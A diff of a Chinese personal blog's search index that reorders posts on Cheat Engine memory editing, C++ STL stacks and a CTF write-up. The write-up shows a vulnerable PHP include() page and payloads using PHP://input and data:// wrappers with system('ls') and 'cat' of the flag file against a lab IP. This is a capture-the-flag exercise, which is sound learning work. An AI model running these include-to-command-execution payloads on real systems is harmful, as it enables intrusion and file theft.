@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CE的工作原理 笔记</title>
+    <url>/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<h2 id="第一部分：基础知识-计算机是如何运行游戏的"><a href="#第一部分：基础知识-计算机是如何运行游戏的" class="headerlink" title="第一部分：基础知识-计算机是如何运行游戏的"></a>第一部分：基础知识-计算机是如何运行游戏的</h2><p>总结:</p>
+<p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217155807949.png" alt="image-20220217155807949"></p>
+<h2 id="第二部分：基础知识-CE的工作原理"><a href="#第二部分：基础知识-CE的工作原理" class="headerlink" title="第二部分：基础知识-CE的工作原理"></a>第二部分：基础知识-CE的工作原理</h2><p>CE监控游戏的内存，并对其进行任意的修改。<img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160325859.png" alt="image-20220217160325859"></p>
+<p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160630264.png" alt="image-20220217160630264"></p>
+<p>修改的一般思路：去哪里 干什么</p>
+<h2 id="第三部分：基础知识-二进制的表示"><a href="#第三部分：基础知识-二进制的表示" class="headerlink" title="第三部分：基础知识-二进制的表示"></a>第三部分：基础知识-二进制的表示</h2><p>十六进制数表示二进制数</p>
+<p>0-F对应 1-15；</p>
+<h2 id="第四部分数据：修改-基本操作"><a href="#第四部分数据：修改-基本操作" class="headerlink" title="第四部分数据：修改-基本操作"></a>第四部分数据：修改-基本操作</h2><p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217161151056.png" alt="image-20220217161151056"></p>
+<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2>]]></content>
+  </entry>
+  <entry>
     <title>JS乱码问题</title>
     <url>/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<h3 id="JS乱码问题"><a href="#JS乱码问题" class="headerlink" title="JS乱码问题"></a>JS乱码问题</h3><p><img src="/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143813041.png" alt="image-20220302143813041"></p>
@@ -22,48 +35,6 @@
 <p>稍微整理一下</p>
 <p>分析代码即可获得答案.</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>CE的工作原理 笔记</title>
-    <url>/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<h2 id="第一部分：基础知识-计算机是如何运行游戏的"><a href="#第一部分：基础知识-计算机是如何运行游戏的" class="headerlink" title="第一部分：基础知识-计算机是如何运行游戏的"></a>第一部分：基础知识-计算机是如何运行游戏的</h2><p>总结:</p>
-<p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217155807949.png" alt="image-20220217155807949"></p>
-<h2 id="第二部分：基础知识-CE的工作原理"><a href="#第二部分：基础知识-CE的工作原理" class="headerlink" title="第二部分：基础知识-CE的工作原理"></a>第二部分：基础知识-CE的工作原理</h2><p>CE监控游戏的内存，并对其进行任意的修改。<img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160325859.png" alt="image-20220217160325859"></p>
-<p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160630264.png" alt="image-20220217160630264"></p>
-<p>修改的一般思路：去哪里 干什么</p>
-<h2 id="第三部分：基础知识-二进制的表示"><a href="#第三部分：基础知识-二进制的表示" class="headerlink" title="第三部分：基础知识-二进制的表示"></a>第三部分：基础知识-二进制的表示</h2><p>十六进制数表示二进制数</p>
-<p>0-F对应 1-15；</p>
-<h2 id="第四部分数据：修改-基本操作"><a href="#第四部分数据：修改-基本操作" class="headerlink" title="第四部分数据：修改-基本操作"></a>第四部分数据：修改-基本操作</h2><p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217161151056.png" alt="image-20220217161151056"></p>
-<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2>]]></content>
-  </entry>
-  <entry>
-    <title>XTCTF Web_php_include</title>
-    <url>/2022/01/16/Web_php_include/</url>
-    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//显示GET请求后hello的值</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//对page进行GET请求，赋值给page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;<span class="comment">//把page和php：// 比较，若page中第一次出现php://，则把php://替代为空</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//包含page</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>打开网页 审计源码。</p>
-<p>由题目Web_php_include可知，该题可能是php中include的漏洞</p>
-<p>百度include漏洞，<a href="https://www.freebuf.com/articles/others-articles/256524.html">参考</a>  可知可以利用 php伪协议进行漏洞利用 <a href="https://www.cnblogs.com/weak-chicken/p/12275806.html">参考</a></p>
-<p>解法1：</p>
-<p>​    注意到strstr函数对大小写非常敏感<img src="/2022/01/16/Web_php_include/image-20220116232319078.png" alt="image-20220116232319078" style="zoom:50%;"></p>
-<p>我们则可以进行php://伪协议时，可以大写PHP，进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=PHP://input </span><br><span class="line">[POST请求] &lt;?php system(&quot;ls&quot;);?&gt;  #列出文件列表 后发现在fl4gisisish3r3.php中</span><br><span class="line">           &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt; #打开文件，发现flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/16/Web_php_include/image-20220116233217504.png" alt="image-20220116233217504"></p>
-<p>第二解法：</p>
-<p>​    利用data://伪协议绕过php协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/16/Web_php_include/image-20220116233423685.png" alt="image-20220116233423685"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22);?%3E（同第一种解法）</span><br><span class="line">可在源文件中找到flag</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
   </entry>
   <entry>
     <title>Web_php_unserialize wp</title>
@@ -97,6 +68,35 @@
       <tags>
         <tag>ctf</tag>
         <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XTCTF Web_php_include</title>
+    <url>/2022/01/16/Web_php_include/</url>
+    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//显示GET请求后hello的值</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//对page进行GET请求，赋值给page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;<span class="comment">//把page和php：// 比较，若page中第一次出现php://，则把php://替代为空</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//包含page</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打开网页 审计源码。</p>
+<p>由题目Web_php_include可知，该题可能是php中include的漏洞</p>
+<p>百度include漏洞，<a href="https://www.freebuf.com/articles/others-articles/256524.html">参考</a>  可知可以利用 php伪协议进行漏洞利用 <a href="https://www.cnblogs.com/weak-chicken/p/12275806.html">参考</a></p>
+<p>解法1：</p>
+<p>​    注意到strstr函数对大小写非常敏感<img src="/2022/01/16/Web_php_include/image-20220116232319078.png" alt="image-20220116232319078" style="zoom:50%;"></p>
+<p>我们则可以进行php://伪协议时，可以大写PHP，进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=PHP://input </span><br><span class="line">[POST请求] &lt;?php system(&quot;ls&quot;);?&gt;  #列出文件列表 后发现在fl4gisisish3r3.php中</span><br><span class="line">           &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt; #打开文件，发现flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/Web_php_include/image-20220116233217504.png" alt="image-20220116233217504"></p>
+<p>第二解法：</p>
+<p>​    利用data://伪协议绕过php协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/Web_php_include/image-20220116233423685.png" alt="image-20220116233423685"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22);?%3E（同第一种解法）</span><br><span class="line">可在源文件中找到flag</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -146,47 +146,13 @@
     <url>/2022/01/14/%E6%AC%A2%E8%BF%8E/</url>
     <content><![CDATA[<h5 id="欢迎"><a href="#欢迎" class="headerlink" title="欢迎"></a>欢迎</h5><p>QQ:1622601726 (无法搜索)<br>QID:Victini258</p>
 ]]></content>
+      <categories>
+        <category>测试</category>
+      </categories>
       <tags>
         <tag>欢迎</tag>
         <tag>首次</tag>
         <tag>测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>表达式的值和计算</title>
-    <url>/2022/06/16/%E5%AE%9E%E9%AA%8C%E8%AF%BE1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC%E5%92%8C%E8%AE%A1%E7%AE%97/</url>
-    <content><![CDATA[<h1 id="第一节课内容"><a href="#第一节课内容" class="headerlink" title="第一节课内容:"></a>第一节课内容:</h1><p>​    预备学习课题任务: 学习使用C++ STL-栈应用<br>​    基本任务: 算数表达式求值(应用map容器)<br>​    扩展任务1:较复杂的表达式求值和交互式求值(难,模板化实现)<br>​    扩展任务2: 求真值表达式的应用<br>​    扩展任务3: 二元树和表达式</p>
-<h2 id="基本任务1"><a href="#基本任务1" class="headerlink" title="基本任务1:"></a>基本任务1:</h2><h3 id="STL-栈应用的实现"><a href="#STL-栈应用的实现" class="headerlink" title="STL-栈应用的实现:"></a>STL-栈应用的实现:</h3><ol>
-<li>  创建一个stack类模板: 名字为stk;</li>
-</ol>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span> &gt; stk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><h4 id="push-用来把元素入栈"><a href="#push-用来把元素入栈" class="headerlink" title="push() 用来把元素入栈"></a>push() 用来把元素入栈</h4>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n); <span class="comment">//stk.push(n) 把n加入到栈中</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-<li><h4 id="top-用来访问栈顶元素"><a href="#top-用来访问栈顶元素" class="headerlink" title="top() 用来访问栈顶元素"></a>top() 用来访问栈顶元素</h4></li>
-</ol>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n);</span><br><span class="line">        <span class="comment">//0 1 2 3</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">// 输出3 //stk.top()的值 也就是栈顶的值3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>  pop() 弹出栈顶元素</li>
-</ol>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">pop</span>();<span class="comment">//移除栈顶元素 (无返回值)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">//输出2 //弹出栈顶后还有一个值就是2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li><p>empty() 判断栈空?</p>
-  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">empty</span>();  <span class="comment">//判断栈是否为空,如果为空则输出true,否则输出false</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;此时栈顶的值为&quot;</span>&lt;&lt;stk.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">		stk.<span class="built_in">pop</span>(); <span class="comment">//弹出元素</span></span><br><span class="line">		cout&lt;&lt;boolalpha&lt;&lt;<span class="string">&quot;栈空?:&quot;</span>&lt;&lt;stk.<span class="built_in">empty</span>()&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* 输出结果:</span></span><br><span class="line"><span class="comment">此时栈顶的值为3</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为2</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为1</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为0</span></span><br><span class="line"><span class="comment">栈空?:true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li><p>size() 统计栈中的元素</p>
-  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>  n=stk.<span class="built_in">size</span>(); <span class="comment">//注意返回值为long long 类型</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,n);</span><br><span class="line">    <span class="comment">//输出:4  //此时栈中共有4个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="简单算数表达式的求值"><a href="#简单算数表达式的求值" class="headerlink" title="简单算数表达式的求值"></a>简单算数表达式的求值</h3></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>algorithm</tag>
       </tags>
   </entry>
 </search>
